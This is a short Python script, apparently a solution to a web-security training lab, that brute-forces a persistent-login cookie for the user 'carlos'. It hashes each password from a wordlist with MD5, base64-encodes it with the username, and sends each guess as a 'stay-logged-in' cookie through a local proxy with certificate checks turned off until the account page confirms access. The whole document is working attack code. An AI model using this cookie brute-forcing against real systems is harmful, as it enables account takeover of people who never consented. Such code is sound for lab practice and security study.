import requests 
import urllib3
import hashlib
import base64

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

url = "https://0a1f00d103e9220e82de6f0700f80091.web-security-academy.net"



with open('password.txt', 'r') as file:
    for i in file:
        password=i.strip()
        md5= hashlib.md5(password.encode()).hexdigest()
        #a = print(f"carlos:{md5}")
        combined = f"carlos:{md5}"
        #print(combined)
        # base64_encode = base64.encode(a,output)
        # print(a)
        base64_encoded = base64.b64encode(combined.encode()).decode()    #.decode()
# Purpose: Converts the Base64 bytes back to a regular string for printing or writing to files
# Why? Printing or saving b'something' isn't as clean — .decode() gives you just the string
        #print(base64_encoded)

        """ wiener_session = requests.session()
        data = {"username":"wiener","password":"peter"}
        response = wiener_session.post(url + "/login", verify=False, proxies=proxies, data=data )
        print("winer session is ",wiener_session.cookies.get_dict())

        carlos_session = requests.session()
        carlos_session.cookies['session'] = wiener_session.cookies['session']
        carlos_session.cookies.set('stay-logged-in':base64_encode)
        print("session for carlos is ",carlos_session.cookies.get_dict())
 """  
        headers = {"Cookie": f"stay-logged-in={base64_encoded}"}
        response1 = requests.get(url + "/my-account/",verify=False,proxies=proxies,headers=headers)
        if "Your username is: carlos" in response1.text:
            print("hash found", base64_encoded)
            break